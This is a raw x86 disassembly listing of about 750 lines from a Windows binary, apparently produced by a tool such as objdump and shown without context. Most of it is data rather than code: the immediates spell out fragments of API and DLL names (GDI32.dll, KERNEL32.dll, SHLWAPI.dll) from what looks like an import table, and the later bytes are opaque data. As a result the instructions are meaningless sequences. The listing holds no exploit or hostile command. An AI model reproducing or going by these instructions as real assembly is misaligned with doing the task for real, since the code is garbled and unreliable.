  4143f7:	add    al,dl
  4143f9:	add    DWORD PTR [ebx+0x65],edx
  4143fc:	je     0x41443f
  4143fe:	bound  ebp,QWORD PTR [edi+0x72]
  414401:	je     0x414453
  414403:	jb     0x414474
  414405:	arpl   WORD PTR [eax],ax
  414407:	add    BYTE PTR [eax+0x66664f01],ah
  41440d:	jae    0x414474
  41440f:	je     0x414463
  414411:	outs   dx,BYTE PTR ds:[si]
  414413:	add    BYTE PTR [edx+eax*1],dl
  414416:	push   edi
  414417:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  41441f:	add    BYTE PTR [eax+0x65724300],dh
  414425:	popa   
  414426:	je     0x41448d
  414428:	push   ebx
  414429:	outs   dx,DWORD PTR ds:[esi]
  41442a:	ins    BYTE PTR es:[edi],dx
  41442b:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  414433:	add    BYTE PTR [edx+0x74654701],cl
  414439:	push   esp
  41443a:	gs js  0x4144b1
  41443d:	dec    ebp
  41443e:	gs je  0x4144b3
  414441:	imul   esp,DWORD PTR [ebx+0x73],0x16c0041
  414448:	inc    edi
  414449:	gs je  0x41449c
  41444c:	popa   
  41444d:	ins    BYTE PTR es:[edi],dx
  41444e:	gs je  0x4144c5
  414451:	gs inc ebp
  414453:	outs   dx,BYTE PTR ds:[esi]
  414454:	je     0x4144c8
  414456:	imul   esp,DWORD PTR [ebp+0x73],0x4300a200
  41445d:	jb     0x4144c4
  41445f:	popa   
  414460:	je     0x4144c7
  414462:	dec    ecx
  414463:	inc    ebx
  414464:	push   edi
  414465:	add    ah,cl
  414467:	add    DWORD PTR [ebx+0x65],edx
  41446a:	ins    BYTE PTR es:[edi],dx
  41446b:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  414470:	imul   esi,DWORD PTR [eax+0x52],0xd3006e67
  414477:	add    DWORD PTR [ebx+0x65],edx
  41447a:	je     0x4144be
  41447c:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  414484:	outs   dx,BYTE PTR gs:[esi]
  414486:	jae    0x4144f1
  414488:	outs   dx,DWORD PTR ds:[esi]
  414489:	outs   dx,BYTE PTR ds:[esi]
  41448a:	inc    ebp
  41448b:	js     0x41448d
  41448d:	add    bh,dl
  41448f:	add    DWORD PTR [ebx+0x65],edx
  414492:	je     0x4144d6
  414494:	jb     0x41450b
  414496:	jae    0x414500
  414498:	dec    edi
  414499:	jb     0x414502
  41449b:	inc    ebp
  41449c:	js     0x41449e
  41449e:	into   
  41449f:	add    DWORD PTR [ebx+0x65],edx
  4144a2:	ins    BYTE PTR es:[edi],dx
  4144a3:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  4144a8:	push   0x65
  4144aa:	arpl   WORD PTR [eax+eax*1+0x0],si
  4144ae:	add    DWORD PTR [ecx],0x47
  4144b1:	gs je  0x414508
  4144b4:	gs js  0x41452b
  4144b7:	inc    ebp
  4144b8:	js     0x41452e
  4144ba:	outs   dx,BYTE PTR gs:[esi]
  4144bc:	je     0x41450e
  4144be:	outs   dx,DWORD PTR ds:[esi]
  4144bf:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  4144c6:	xlat   BYTE PTR ds:[ebx]
  4144c7:	add    BYTE PTR [esi+0x69],al
  4144ca:	ins    BYTE PTR es:[edi],dx
  4144cb:	ins    BYTE PTR es:[edi],dx
  4144cc:	push   edx
  4144cd:	outs   dx,BYTE PTR ds:[si]
  4144cf:	add    BYTE PTR [esi+0x65724300],dl
  4144d5:	popa   
  4144d6:	je     0x41453d
  4144d8:	inc    ebp
  4144d9:	ins    BYTE PTR es:[edi],dx
  4144da:	ins    BYTE PTR es:[edi],dx
  4144db:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  4144e2:	outs   dx,BYTE PTR ds:[esi]
  4144e3:	dec    ecx
  4144e4:	outs   dx,BYTE PTR ds:[esi]
  4144e5:	imul   esi,DWORD PTR fs:[edx+0x65],0x6e007463
  4144ed:	add    DWORD PTR [edi+0x65],eax
  4144f0:	je     0x414542
  4144f2:	imul   edi,DWORD PTR [eax+0x65],0x7700006c
  4144f9:	add    DWORD PTR [edi+0x65],eax
  4144fc:	je     0x414551
  4144fe:	je     0x41456f
  414500:	arpl   WORD PTR [ebx+0x4f],bp
  414503:	bound  ebp,QWORD PTR [edx+0x65]
  414506:	arpl   WORD PTR [eax+eax*1+0x0],si
  41450a:	cmp    al,BYTE PTR [ecx]
  41450c:	inc    edi
  41450d:	gs je  0x414553
  414510:	jne    0x414584
  414512:	jb     0x414579
  414514:	outs   dx,BYTE PTR ds:[esi]
  414515:	je     0x414566
  414517:	bound  ebp,QWORD PTR [edx+0x65]
  41451a:	arpl   WORD PTR [eax+eax*1+0x0],si
  41451e:	jno    0x414521
  414520:	inc    edi
  414521:	gs je  0x414576
  414524:	dec    edi
  414525:	push   eax
  414526:	xor    al,BYTE PTR [eax]
  414528:	stos   DWORD PTR es:[edi],eax
  414529:	add    BYTE PTR [ebx+0x72],al
  41452c:	gs popa 
  41452e:	je     0x414595
  414530:	push   edx
  414531:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  414536:	outs   dx,BYTE PTR ds:[esi]
  414537:	add    BYTE PTR [edx+eax*1],al
  41453a:	push   ebx
  41453b:	je     0x41459e
  41453d:	jb     0x4145b3
  41453f:	inc    esp
  414540:	outs   dx,DWORD PTR ds:[esi]
  414541:	arpl   WORD PTR [edi+0x0],dx
  414544:	jbe    0x414546
  414546:	inc    edx
  414547:	imul   esi,DWORD PTR [edx+eax*2+0x6c],0x75000074
  41454f:	add    BYTE PTR [edx+0x65],al
  414552:	imul   ebp,DWORD PTR [bp+0x50],0x687461
  41455a:	mov    eax,0x61655201
  41455f:	ins    BYTE PTR es:[edi],dx
  414560:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  414567:	je     0x4145dd
  414569:	add    BYTE PTR gs:[eax],al
  41456c:	inc    edi
  41456d:	inc    esp
  41456e:	dec    ecx
  41456f:	xor    esi,DWORD PTR [edx]
  414571:	cs fs ins BYTE PTR es:[edi],dx
  414574:	ins    BYTE PTR es:[edi],dx
  414575:	add    BYTE PTR [eax+0x1],ah
  414578:	inc    esi
  414579:	imul   ebp,DWORD PTR [esi+0x64],0x73726946
  414580:	je     0x4145c8
  414582:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x3040000
  41458a:	dec    esp
  41458b:	gs popa 
  41458d:	jbe    0x4145f4
  41458f:	inc    ebx
  414590:	jb     0x4145fb
  414592:	je     0x4145fd
  414594:	arpl   WORD PTR [ecx+0x6c],sp
  414597:	push   ebx
  414598:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41459d:	outs   dx,BYTE PTR ds:[esi]
  41459e:	add    BYTE PTR [eax],al
  4145a0:	add    eax,DWORD PTR [ecx]
  4145a2:	inc    esp
  4145a3:	gs ins BYTE PTR es:[edi],dx
  4145a5:	gs je  0x41460d
  4145a8:	inc    esi
  4145a9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x4902b900
  4145b1:	outs   dx,BYTE PTR ds:[esi]
  4145b2:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  4145ba:	inc    ebx
  4145bb:	jb     0x414626
  4145bd:	je     0x414628
  4145bf:	arpl   WORD PTR [ecx+0x6c],sp
  4145c2:	push   ebx
  4145c3:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4145c8:	outs   dx,BYTE PTR ds:[esi]
  4145c9:	add    BYTE PTR [edx+0x6c614300],ah
  4145cf:	ins    BYTE PTR es:[edi],dx
  4145d0:	dec    esi
  4145d1:	popa   
  4145d2:	ins    DWORD PTR es:[edi],dx
  4145d3:	gs fs push eax
  4145d6:	imul   esi,DWORD PTR [eax+0x65],0x12000057
  4145dd:	add    al,0x53
  4145df:	gs je  0x414627
  4145e2:	jb     0x414656
  4145e4:	outs   dx,DWORD PTR ds:[esi]
  4145e5:	jb     0x414634
  4145e7:	outs   dx,DWORD PTR ds:[esi]
  4145e8:	fs add BYTE PTR gs:[eax],al
  4145ec:	pop    edi
  4145ed:	add    al,BYTE PTR [edi+0x65]
  4145f0:	je     0x414646
  4145f2:	gs ins DWORD PTR es:[edi],dx
  4145f4:	jo     0x41463c
  4145f6:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x41656d61
  4145fe:	add    BYTE PTR [eax],al
  414600:	cmc    
  414601:	add    BYTE PTR [ebx+0x72],al
  414604:	gs popa 
  414606:	je     0x41466d
  414608:	push   edi
  414609:	popa   
  41460a:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  414612:	ins    DWORD PTR es:[edi],dx
  414613:	gs jb  0x41466d
  414616:	add    BYTE PTR [eax],al
  414618:	pop    ebp
  414619:	add    DWORD PTR [esi+0x69],eax
  41461c:	outs   dx,BYTE PTR ds:[esi]
  41461d:	fs inc esi
  41461f:	imul   esi,DWORD PTR [edx+0x73],0x6c694674
  414626:	gs inc ecx
  414628:	add    BYTE PTR [eax],al
  41462a:	test   al,0x2
  41462c:	dec    eax
  41462d:	gs popa 
  41462f:	jo     0x41467d
  414631:	outs   dx,DWORD PTR ds:[esi]
  414632:	arpl   WORD PTR [ebx+0x0],bp
  414635:	add    BYTE PTR [ebx+eax*1+0x6f6d6552],dh
  41463c:	jbe    0x4146a3
  41463e:	inc    esp
  41463f:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  414646:	jns    0x41469f
  414648:	add    BYTE PTR [eax],al
  41464a:	rol    BYTE PTR [eax],cl
  41464c:	inc    ebx
  41464d:	jb     0x4146b4
  41464f:	popa   
  414650:	je     0x4146b7
  414652:	inc    esi
  414653:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41465b:	outs   dx,BYTE PTR ds:[esi]
  41465c:	addr16 push edi
  41465e:	add    BYTE PTR [eax],al
  414660:	adc    al,0x3
  414662:	dec    esp
  414663:	outs   dx,DWORD PTR ds:[esi]
  414664:	arpl   WORD PTR [ecx+0x6c],sp
  414667:	push   ebx
  414668:	imul   edi,DWORD PTR [edx+0x65],0x47024200
  41466f:	gs je  0x4146c5
  414672:	push   0x5074726f
  414677:	popa   
  414678:	je     0x4146e2
  41467a:	dec    esi
  41467b:	popa   
  41467c:	ins    DWORD PTR es:[edi],dx
  41467d:	gs inc ecx
  41467f:	add    BYTE PTR ds:0x74654702,cl
  414685:	dec    ebp
  414686:	outs   dx,DWORD PTR ds:[esi]
  414687:	fs jne 0x4146f6
  41468a:	gs dec eax
  41468c:	popa   
  41468d:	outs   dx,BYTE PTR ds:[esi]
  41468e:	fs ins BYTE PTR es:[edi],dx
  414690:	gs push edi
  414692:	add    BYTE PTR [eax],al
  414694:	mov    ds:0x69725704,eax
  414699:	je     0x414700
  41469b:	inc    esi
  41469c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x6c470298
  4146a4:	outs   dx,DWORD PTR ds:[esi]
  4146a5:	bound  esp,QWORD PTR [ecx+0x6c]
  4146a8:	push   ebx
  4146a9:	imul   edi,DWORD PTR [edx+0x65],0xea0000
  4146b0:	inc    ebx
  4146b1:	jb     0x414718
  4146b3:	popa   
  4146b4:	je     0x41471b
  4146b6:	push   ebx
  4146b7:	gs ins DWORD PTR es:[edi],dx
  4146b9:	popa   
  4146ba:	jo     0x414724
  4146bc:	outs   dx,DWORD PTR ds:[esi]
  4146bd:	jb     0x414724
  4146bf:	push   edi
  4146c0:	add    BYTE PTR [eax],al
  4146c2:	jmp    0x4146c5
  4146c4:	inc    edi
  4146c5:	gs je  0x41470e
  4146c8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  4146d0:	bound  esi,QWORD PTR [ebp+0x74]
  4146d3:	gs jae 0x41471b
  4146d6:	js     0x41472f
  4146d8:	add    BYTE PTR [eax],al
  4146da:	mov    ebx,0x73655203
  4146df:	gs je  0x414727
  4146e2:	jbe    0x414749
  4146e4:	outs   dx,BYTE PTR ds:[esi]
  4146e5:	je     0x4146e7
  4146e7:	add    BYTE PTR [esi+0x4],cl
  4146ea:	push   ebx
  4146eb:	ins    BYTE PTR es:[edi],dx
  4146ec:	gs gs jo 0x414735
  4146f0:	js     0x4146f2
  4146f2:	int3   
  4146f3:	add    al,0x6c
  4146f5:	jae    0x41476b
  4146f7:	jb     0x41475c
  4146f9:	jo     0x414774
  4146fb:	outs   dx,BYTE PTR ds:[esi]
  4146fc:	push   edi
  4146fd:	add    dl,cl
  4146ff:	add    BYTE PTR [ebx+0x72],al
  414702:	gs popa 
  414704:	je     0x41476b
  414706:	inc    ebp
  414707:	jbe    0x41476e
  414709:	outs   dx,BYTE PTR ds:[esi]
  41470a:	je     0x41474d
  41470c:	add    BYTE PTR [eax],al
  41470e:	push   eax
  41470f:	add    al,BYTE PTR [edi+0x65]
  414712:	je     0x414767
  414714:	jns    0x414789
  414716:	je     0x41477d
  414718:	ins    DWORD PTR es:[edi],dx
  414719:	inc    esp
  41471a:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  414721:	jns    0x41477a
  414723:	add    BYTE PTR [edx+0x4],bh
  414726:	push   esi
  414727:	gs jb  0x41477d
  41472a:	gs je  0x414770
  41472d:	outs   dx,DWORD PTR ds:[esi]
  41472e:	outs   dx,BYTE PTR ds:[esi]
  41472f:	imul   esi,DWORD PTR fs:[ecx+ebp*2+0x6f],0x73614d6e
  414738:	imul   eax,DWORD PTR [eax],0x7
  41473b:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  41473f:	fs dec esp
  414741:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  414748:	js     0x4147a1
  41474a:	add    BYTE PTR [eax],al
  41474c:	pop    edi
  41474d:	add    al,0x54
  41474f:	ins    BYTE PTR es:[edi],dx
  414750:	jae    0x414799
  414752:	gs je  0x4147ab
  414755:	popa   
  414756:	ins    BYTE PTR es:[edi],dx
  414757:	jne    0x4147be
  414759:	add    bl,cl
  41475b:	add    cl,BYTE PTR [ecx+0x73]
  41475e:	inc    edx
  41475f:	popa   
  414760:	fs push edx
  414762:	gs popa 
  414764:	fs push eax
  414766:	je     0x4147da
  414768:	add    BYTE PTR [eax],al
  41476a:	inc    ebx
  41476b:	add    al,BYTE PTR [edi+0x65]
  41476e:	je     0x4147c3
  414770:	push   0x5074726f
  414775:	popa   
  414776:	je     0x4147e0
  414778:	dec    esi
  414779:	popa   
  41477a:	ins    DWORD PTR es:[edi],dx
  41477b:	gs push edi
  41477d:	add    BYTE PTR [edx+eax*1+0x47],dh
  414781:	gs je  0x4147d9
  414784:	jae    0x4147eb
  414786:	jb     0x4147cc
  414788:	gs popaw 
  41478b:	jne    0x4147f9
  41478d:	je     0x4147db
  41478f:	popa   
  414790:	outs   dx,BYTE PTR ds:[esi]
  414791:	addr16 dec ecx
  414793:	inc    esp
  414794:	add    BYTE PTR [eax],al
  414796:	adc    DWORD PTR [ebx],eax
  414798:	dec    esp
  414799:	outs   dx,DWORD PTR ds:[esi]
  41479a:	arpl   WORD PTR [ecx+0x6c],sp
  41479d:	dec    esp
  41479e:	outs   dx,DWORD PTR ds:[esi]
  41479f:	arpl   WORD PTR [ebx+0x0],bp
  4147a2:	mov    ecx,0x6e6f4300
  4147a7:	jbe    0x41480e
  4147a9:	jb     0x41481f
  4147ab:	inc    esp
  4147ac:	gs popaw 
  4147af:	jne    0x41481d
  4147b1:	je     0x4147ff
  4147b3:	outs   dx,DWORD PTR ds:[esi]
  4147b4:	arpl   WORD PTR [ecx+0x6c],sp
  4147b7:	add    BYTE PTR gs:[eax],al
  4147ba:	inc    BYTE PTR [ecx]
  4147bc:	inc    edi
  4147bd:	gs je  0x41480c
  4147c0:	outs   dx,DWORD PTR ds:[esi]
  4147c1:	arpl   WORD PTR [ecx+0x6c],sp
  4147c4:	gs dec ecx
  4147c6:	outs   dx,BYTE PTR ds:[esi]
  4147c7:	outs   dx,WORD PTR ds:[esi]
  4147c9:	inc    ecx
  4147ca:	add    BYTE PTR [eax],al
  4147cc:	loopne 0x4147ce
  4147ce:	inc    ebx
  4147cf:	jb     0x414836
  4147d1:	popa   
  4147d2:	je     0x414839
  4147d4:	dec    ebp
  4147d5:	jne    0x41484b
  4147d7:	gs js  0x414831
  4147da:	add    BYTE PTR [eax],al
  4147dc:	adc    eax,0x74655304
  4147e1:	inc    esi
  4147e2:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x54736970
  4147ea:	outs   dx,DWORD PTR ds:[esi]
  4147eb:	dec    edi
  4147ec:	inc    ebp
  4147ed:	dec    ebp
  4147ee:	add    BYTE PTR [eax],al
  4147f0:	xor    DWORD PTR [ecx],eax
  4147f2:	inc    ebp
  4147f3:	jae    0x414858
  4147f5:	popa   
  4147f6:	jo     0x41485d
  4147f8:	inc    ebx
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	ins    DWORD PTR es:[edi],dx
  4147fb:	ins    DWORD PTR es:[edi],dx
  4147fc:	inc    esi
  4147fd:	jne    0x41486d
  4147ff:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  414803:	outs   dx,BYTE PTR ds:[esi]
  414804:	add    BYTE PTR [eax],al
  414806:	ss add al,0x53
  414809:	gs je  0x414860
  41480c:	push   0x64616572
  414811:	inc    ebx
  414812:	outs   dx,DWORD PTR ds:[esi]
  414813:	outs   dx,BYTE PTR ds:[esi]
  414814:	je     0x41487b
  414816:	js     0x41488c
  414818:	add    BYTE PTR [eax],al
  41481a:	sub    eax,DWORD PTR [ebx]
  41481c:	dec    ebp
  41481d:	outs   dx,DWORD PTR ds:[esi]
  41481e:	jbe    0x414885
  414820:	inc    esi
  414821:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x67004178
  414829:	add    al,BYTE PTR [edi+0x65]
  41482c:	je     0x414882
  41482e:	push   0x64616572
  414833:	dec    esp
  414834:	outs   dx,DWORD PTR ds:[esi]
  414835:	arpl   WORD PTR [ecx+0x6c],sp
  414838:	add    BYTE PTR gs:[ebp+0x4],ch
  41483c:	push   ebp
  41483d:	outs   dx,BYTE PTR ds:[esi]
  41483e:	ins    BYTE PTR es:[edi],dx
  41483f:	outs   dx,DWORD PTR ds:[esi]
  414840:	arpl   WORD PTR [ebx+0x46],bp
  414843:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x41007d00
  41484b:	fs fs inc ecx
  41484e:	je     0x4148bf
  414850:	ins    DWORD PTR es:[edi],dx
  414851:	push   edi
  414852:	add    BYTE PTR [eax],al
  414854:	push   ebp
  414855:	add    al,BYTE PTR [edi+0x65]
  414858:	je     0x4148ad
  41485a:	jns    0x4148cf
  41485c:	je     0x4148c3
  41485e:	ins    DWORD PTR es:[edi],dx
  41485f:	push   esp
  414860:	imul   ebp,DWORD PTR [ebp+0x65],0x756a6441
  414867:	jae    0x4148dd
  414869:	ins    DWORD PTR es:[edi],dx
  41486a:	outs   dx,BYTE PTR gs:[esi]
  41486c:	je     0x41486e
  41486e:	mov    WORD PTR [edi+edx*2],es
  414871:	popa   
  414872:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6c754d72
  41487a:	je     0x4148e5
  41487c:	jo     0x4148ea
  41487e:	gs dec edi
  414880:	bound  ebp,QWORD PTR [edx+0x65]
  414883:	arpl   WORD PTR [ebx+esi*2+0x0],si
  414887:	add    BYTE PTR [ecx+0x2],ah
  41488a:	inc    edi
  41488b:	gs je  0x4148e2
  41488e:	gs ins DWORD PTR es:[edi],dx
  414890:	jo     0x4148e2
  414892:	popa   
  414893:	je     0x4148fd
  414895:	inc    ecx
  414896:	add    BYTE PTR [eax],al
  414898:	out    dx,al
  414899:	add    DWORD PTR [edi+0x65],eax
  41489c:	je     0x4148e4
  41489e:	imul   ebp,DWORD PTR [ebp+eiz*2+0x53],0x657a69
  4148a6:	mov    BYTE PTR [esp+ebp*2],0x73
  4148aa:	je     0x41491e
  4148ac:	arpl   WORD PTR [ebp+0x70],bp
  4148af:	imul   edx,DWORD PTR [edi+0x0],0x6c470290
  4148b6:	outs   dx,DWORD PTR ds:[esi]
  4148b7:	bound  esp,QWORD PTR [ecx+0x6c]
  4148ba:	inc    esi
  4148bb:	jb     0x414922
  4148bd:	add    BYTE PTR gs:[eax],al
  4148c0:	rol    DWORD PTR [eax],1
  4148c2:	inc    ebx
  4148c3:	jb     0x41492a
  4148c5:	popa   
  4148c6:	je     0x41492d
  4148c8:	inc    esi
  4148c9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  4148d1:	outs   dx,BYTE PTR ds:[esi]
  4148d2:	addr16 inc ecx
  4148d4:	add    BYTE PTR [eax],al
  4148d6:	cmp    al,BYTE PTR [ebx]
  4148d8:	dec    edi
  4148d9:	jo     0x414940
  4148db:	outs   dx,BYTE PTR ds:[esi]
  4148dc:	inc    esi
  4148dd:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x52454b00
  4148e5:	dec    esi
  4148e6:	inc    ebp
  4148e7:	dec    esp
  4148e8:	xor    esi,DWORD PTR [edx]
  4148ea:	cs fs ins BYTE PTR es:[edi],dx
  4148ed:	ins    BYTE PTR es:[edi],dx
  4148ee:	add    BYTE PTR [eax],al
  4148f0:	push   ss
  4148f1:	add    BYTE PTR [eax+0x72],dl
  4148f4:	imul   ebp,DWORD PTR [esi+0x74],0x45676c44
  4148fb:	js     0x414954
  4148fd:	add    BYTE PTR [ebx],dl
  4148ff:	add    BYTE PTR [eax+0x61],dl
  414902:	addr16 gs push ebx
  414905:	gs je  0x41497d
  414908:	jo     0x41494e
  41490a:	ins    BYTE PTR es:[edi],dx
  41490b:	addr16 push edi
  41490d:	add    BYTE PTR [edx],al
  41490f:	add    BYTE PTR [ebx+0x68],al
  414912:	outs   dx,DWORD PTR ds:[esi]
  414913:	outs   dx,DWORD PTR ds:[esi]
  414914:	jae    0x41497b
  414916:	inc    ebx
  414917:	outs   dx,DWORD PTR ds:[esi]
  414918:	ins    BYTE PTR es:[edi],dx
  414919:	outs   dx,DWORD PTR ds:[esi]
  41491a:	jb     0x414973
  41491c:	add    BYTE PTR [eax],al
  41491e:	or     al,0x0
  414920:	inc    edi
  414921:	gs je  0x41496a
  414924:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656c7469
  41492c:	push   edi
  41492d:	add    BYTE PTR [edi],cl
  41492f:	add    BYTE PTR [edi+0x65],al
  414932:	je     0x414987
  414934:	popa   
  414935:	jbe    0x41499c
  414937:	inc    esi
  414938:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x41656d61
  414940:	add    BYTE PTR [eax],al
  414942:	arpl   WORD PTR [edi+0x6d],bp
  414945:	fs ins BYTE PTR es:[edi],dx
  414947:	xor    esi,DWORD PTR [bp+si]
  41494a:	cs fs ins BYTE PTR es:[edi],dx
  41494d:	ins    BYTE PTR es:[edi],dx
  41494e:	add    BYTE PTR [eax],al
  414950:	inc    esp
  414951:	add    BYTE PTR [eax+0x61],dl
  414954:	je     0x4149be
  414956:	inc    esi
  414957:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x74736978
  41495f:	jae    0x4149a2
  414961:	add    BYTE PTR [ebx+0x48],dl
  414964:	dec    esp
  414965:	push   edi
  414966:	inc    ecx
  414967:	push   eax
  414968:	dec    ecx
  414969:	cs fs ins BYTE PTR es:[edi],dx
  41496c:	ins    BYTE PTR es:[edi],dx
  41496d:	add    BYTE PTR [ebx+0x70],dh
  414970:	push   ecx
  414971:	dec    edx
  414972:	push   0x47
  414974:	jne    0x4149bc
  414976:	mov    dl,0x4d
  414978:	inc    ecx
  414979:	add    BYTE PTR [edx-0x41ffbeb3],bh
  41497f:	dec    ebx
  414980:	inc    ecx
  414981:	add    bh,ch
  414983:	or     esi,DWORD PTR [edx+0x3a4f710e]
  414989:	dec    edi
  41498a:	ja     0x4149db
  41498c:	cmp    eax,0x304f4f4f
  414991:	dec    edi
  414992:	jb     0x4149e3
  414994:	xor    ecx,DWORD PTR [edi+0x5e]
  414997:	dec    edi
  414998:	ss dec edi
  41499a:	jnp    0x4149eb
  41499c:	sub    DWORD PTR [edi+0x3a],ecx
  41499f:	dec    edi
  4149a0:	sub    cl,BYTE PTR [edi+0x1e]
  4149a3:	push   edx
  4149a4:	pop    ds
  4149a5:	push   ebx
  4149a6:	xor    DWORD PTR [edi+0x71],ecx
  4149a9:	dec    edi
  4149aa:	cmp    cl,BYTE PTR [edi+0x77]
  4149ad:	dec    edi
  4149ae:	cmp    eax,0x304f4f4f
  4149b3:	dec    edi
  4149b4:	jb     0x414a05
  4149b6:	xor    ecx,DWORD PTR [edi+0x5e]
  4149b9:	dec    edi
  4149ba:	ss dec edi
  4149bc:	popa   
  4149bd:	dec    edi
  4149be:	sub    DWORD PTR [edi+0x3a],ecx
  4149c1:	dec    edi
  4149c2:	sub    cl,BYTE PTR [edi+0x1e]
  4149c5:	bound  ebx,QWORD PTR [edi]
  4149c7:	arpl   WORD PTR [ecx],si
  4149c9:	dec    edi
  4149ca:	jno    0x414a1b
  4149cc:	cmp    cl,BYTE PTR [edi+0x6a]
  4149cf:	dec    edi
  4149d0:	cmp    eax,0x314f7b4f
  4149d5:	dec    edi
  4149d6:	dec    esp
  4149d7:	dec    edi
  4149d8:	xor    al,0x4f
  4149da:	cmp    cl,BYTE PTR [edi+0x28]
  4149dd:	dec    edi
  4149de:	push   ds
  4149df:	jb     0x414a00
  4149e1:	jae    0x4149f2
  4149e3:	add    DWORD PTR [eax],0xffffff80
  4149e6:	jo     0x414978
  4149e8:	jno    0x41497b
  4149ea:	aas    
  4149eb:	dec    edi
  4149ec:	jbe    0x414a3d
  4149ee:	cmp    cl,BYTE PTR [edi+0x76]
  4149f1:	dec    edi
  4149f2:	ds dec edi
  4149f4:	dec    esp
  4149f5:	dec    edi
  4149f6:	xor    DWORD PTR [edi+0x7b],ecx
  4149f9:	dec    edi
  4149fa:	xor    eax,0x364f3a4f
  4149ff:	dec    edi
  414a00:	push   ds
  414a01:	sbb    BYTE PTR [edi],0x83
  414a04:	setae  BYTE PTR [eax]
  414a07:	nop
  414a08:	jo     0x4149aa
  414a0a:	jno    0x4149ad
  414a0c:	aas    
  414a0d:	dec    edi
  414a0e:	jbe    0x414a5f
  414a10:	cmp    cl,BYTE PTR [edi+0x76]
  414a13:	dec    edi
  414a14:	ds dec edi
  414a16:	dec    esp
  414a17:	dec    edi
  414a18:	xor    DWORD PTR [edi+0x61],ecx
  414a1b:	dec    edi
  414a1c:	xor    eax,0x364f3a4f
  414a21:	dec    edi
  414a22:	push   ds
  414a23:	xchg   edx,eax
  414a24:	pop    ds
  414a25:	xchg   ebx,eax
  414a26:	bt     DWORD PTR [eax],eax
  414a29:	mov    al,ds:0xb171b070
  414a2e:	aas    
  414a2f:	dec    edi
  414a30:	pusha  
  414a31:	dec    edi
  414a32:	cmp    cl,BYTE PTR [edi+0x4e]
  414a35:	dec    edi
  414a36:	cmp    eax,0x314f7b4f
  414a3b:	dec    edi
  414a3c:	dec    ecx
  414a3d:	dec    edi
  414a3e:	xor    al,0x4f
  414a40:	cmp    cl,BYTE PTR [edi+0x36]
  414a43:	dec    edi
  414a44:	push   ds
  414a45:	mov    ds:0xb30fa31f,al
  414a4a:	add    BYTE PTR [eax-0x3e8e3f90],dh
  414a50:	aas    
  414a51:	dec    edi
  414a52:	pusha  
  414a53:	dec    edi
  414a54:	cmp    cl,BYTE PTR [edi+0x4e]
  414a57:	dec    edi
  414a58:	cmp    eax,0x314f704f
  414a5d:	dec    edi
  414a5e:	pop    edi
  414a5f:	dec    edi
  414a60:	xor    ecx,DWORD PTR [edi+0x3a]
  414a63:	dec    edi
  414a64:	xor    eax,0x1fb21e4f
  414a69:	mov    bl,0xf
  414a6b:	ret    
  414a6c:	add    al,al
  414a6e:	jo     0x414a40
  414a70:	jno    0x414a43
  414a72:	aas    
  414a73:	dec    edi
  414a74:	pusha  
  414a75:	dec    edi
  414a76:	cmp    cl,BYTE PTR [edi+0x4e]
  414a79:	dec    edi
  414a7a:	cmp    eax,0x314f6a4f
  414a7f:	dec    edi
  414a80:	dec    esi
  414a81:	dec    edi
  414a82:	xor    al,0x4f
  414a84:	cmp    cl,BYTE PTR [edi+0x28]
  414a87:	dec    edi
  414a88:	push   ds
  414a89:	ret    0xc31f
  414a8c:	psrlq  mm0,QWORD PTR [eax]
  414a8f:	shl    BYTE PTR [eax-0x20],1
  414a92:	jno    0x414a75
  414a94:	aas    
  414a95:	dec    edi
  414a96:	pusha  
  414a97:	dec    edi
  414a98:	cmp    cl,BYTE PTR [edi+0x4e]
  414a9b:	dec    edi
  414a9c:	cmp    eax,0x314f6b4f
  414aa1:	dec    edi
  414aa2:	dec    esp
  414aa3:	dec    edi
  414aa4:	xor    al,0x4f
  414aa6:	cmp    cl,BYTE PTR [edi+0x36]
  414aa9:	dec    edi
  414aaa:	push   ds
  414aab:	rcr    BYTE PTR [edi],cl
  414aad:	ror    DWORD PTR [edi],cl
  414aaf:	jecxz  0x414ab1
  414ab1:	loopne 0x414b23
  414ab3:	lock jno 0x414aa7
  414ab6:	aas    
  414ab7:	dec    edi
  414ab8:	ins    DWORD PTR es:[edi],dx
  414ab9:	dec    edi
  414aba:	cmp    cl,BYTE PTR [edi+0x5f]
  414abd:	dec    edi
  414abe:	cmp    eax,0x3e4f4a4f
  414ac3:	dec    edi
  414ac4:	cmp    cl,BYTE PTR [edi+0x3f]
  414ac7:	dec    edi
  414ac8:	push   ds
  414ac9:	loop   0x414aea
  414acb:	jecxz  0x414adc
  414acd:	repz add al,dh
  414ad0:	jo     0x414ad2
  414ad2:	jno    0x414ad5
  414ad4:	jo     0x414ae6
  414ad6:	jno    0x414ae9
